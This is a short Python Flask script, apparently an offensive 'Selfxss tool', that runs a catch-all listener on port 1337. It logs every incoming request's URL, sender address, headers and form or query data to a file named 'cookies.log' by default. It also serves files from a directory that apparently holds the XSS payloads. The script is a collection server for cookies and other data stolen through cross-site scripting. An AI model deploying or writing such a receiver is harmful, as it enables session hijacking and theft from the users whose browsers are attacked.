
from flask import Flask, request, jsonify, send_from_directory
import json
import argparse
app = Flask(__name__,static_url_path='')
@app.route('/info', methods=['GET','POST']) # Print info 
def info():
    return "<h3>Selfxss Tool</h3>" 
#------------------------------------------
@app.route('/f/<path:path>')
def send_js(path):
    return send_from_directory('f', path)
#------------------------------------------
@app.errorhandler(404) 
@app.errorhandler(400)
@app.route('/<path:path>', methods=['GET','POST'])
def SaveData(e='',path=''):
    LogFile = open (Arguments.log, "a+")
    LogFile.write("-" * 33 + '\n')
    LogFile.write("URL: {} \n".format(request.url))
    LogFile.write("Requester: {} \n".format(request.remote_addr))
    LogFile.write("Method: {} \n".format(request.method))
    LogFile.write("Path: {} \n".format(path))
    LogFile.write("Headers: [{}]\n".format(request.headers).replace('\r\n',' , '))
    if len(request.args) > 0:
            LogFile.write("Get Args: {} \n".format(request.args.to_dict()))
    if len (request.form) > 0:
        LogFile.write("Post Args: {} \n".format(json.dumps(request.form.to_dict())))
    LogFile.close()
    return '<html><b>{}</b></html>'.format(Arguments.canary) , 200

if __name__ == "__main__":
    global Arguments 
    #------------------------------------------
    parser = argparse.ArgumentParser(description='Selfxss tool | coded by anezatra')
    parser.add_argument('--log', default='cookies.log' , help='Path to the log file')
    parser.add_argument('--port', default=1337 , help='Port / HTTP')
    parser.add_argument('--ip', default='0.0.0.0' , help='IP e.g. : 0.0.0.0 or 127.0.0.1')
    parser.add_argument('--canary', default='byselfxsstool' , help='Canary value')
    Arguments = parser.parse_args()
    #------------------------------------------
    try:
        app.run(host=Arguments.ip , port=int(Arguments.port),threaded=True) 
    except:
        parser.print_help()
